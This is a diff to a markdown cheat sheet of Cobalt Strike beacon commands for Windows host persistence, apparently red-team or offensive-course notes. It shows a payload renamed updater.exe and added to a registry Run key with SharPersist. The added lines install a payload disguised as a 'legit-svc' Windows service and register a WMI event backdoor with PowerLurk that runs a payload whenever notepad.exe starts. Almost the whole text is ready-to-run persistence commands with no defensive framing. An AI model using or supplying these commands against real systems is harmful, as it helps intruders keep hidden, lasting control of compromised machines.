@@ -1,6 +1,4 @@
-# Host Persistence 
-
-NORMAL USER
+# Host Persistence (Normal User)
 
 # Default location for powershell
 
@@ -35,3 +33,19 @@ NORMAL USER
     beacon> upload C:\Payloads\http_x64.exe
     beacon> mv http_x64.exe updater.exe
     beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
+
+# Host Persistence (Privileged System User)
+
+# Windows Service
+
+    beacon> cd C:\Windows
+    beacon> upload C:\Payloads\tcp-local_x64.svc.exe
+    beacon> mv tcp-local_x64.svc.exe legit-svc.exe
+    beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
+
+# Register WMI event to trigger our payload
+
+    beacon> cd C:\Windows
+    beacon> upload C:\Payloads\dns_x64.exe
+    beacon> powershell-import C:\Tools\PowerLurk.ps1
+    beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
